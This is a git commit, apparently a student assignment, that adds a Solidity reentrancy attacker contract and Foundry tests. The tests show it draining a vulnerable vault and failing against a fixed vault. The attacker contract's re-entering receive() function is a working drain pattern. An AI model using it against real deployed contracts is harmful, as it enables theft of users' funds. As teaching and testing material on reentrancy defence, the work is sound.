eea023e77ee0796bd37bd00cc663aa04df13d5f6
Froshboss <farouqalhassan5@gmail.com>
2026-04-13 12:45:26 +0100

    assignment submission

---
+++ src/Attack.sol
@@ -0,0 +1,29 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface AttackVault {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+contract Attacker {
+    AttackVault public vault;
+
+    constructor(address _vault) {
+        vault = AttackVault(_vault);
+    }
+    
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need at least 1 ETH");
+
+        vault.deposit{value: msg.value}();
+        vault.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (address(vault).balance >= 1 ether) {
+            vault.withdraw(1 ether);
+        }
+    }
+}
---
+++ test/test.t.sol
@@ -0,0 +1,64 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import "../src/test.sol";
+import "../src/Attack.sol";
+import "../src/Fixer.sol";
+
+contract VaultTest is Test {
+    BalanceVault vault;
+    Attacker attacker;
+    FixedVault fixedVault;
+
+   
+    address victim = address(1);
+    receive() external payable {}
+    function setUp() public {
+        vault = new BalanceVault();
+        attacker = new Attacker(address(vault));
+        fixedVault = new FixedVault();
+    }
+    
+   
+    function testReentrancyAttack() public {
+        vm.deal(victim, 5 ether);
+        vm.prank(victim);
+        vault.deposit{value: 5 ether}();
+
+        vm.deal(address(attacker), 1 ether);
+        vm.prank(address(attacker));
+        attacker.attack{value: 1 ether}();
+
+        assertEq(address(vault).balance, 0);
+
+        assertGt(address(attacker).balance, 1 ether);
+    }
+
+    function testAttackFailsAfterFix() public {
+        Attacker attacker2 = new Attacker(address(fixedVault));
+        vm.deal(victim, 5 ether);
+        vm.prank(victim);
+        fixedVault.deposit{value: 5 ether}();
+
+        vm.deal(address(attacker2), 1 ether);
+        vm.prank(address(attacker2));
+        vm.expectRevert(); // can specify message if desired
+        attacker2.attack{value: 1 ether}();
+
+        assertEq(address(fixedVault).balance, 5 ether);
+    }
+
+    function testLegitWithdrawStillWorks() public {
+    address user = address(2);
+
+    vm.deal(user, 2 ether);
+
+    vm.startPrank(user);
+    fixedVault.deposit{value: 2 ether}();
+    fixedVault.withdraw(1 ether);
+    vm.stopPrank();
+
+    assertEq(address(fixedVault).balance, 1 ether);
+}
+}
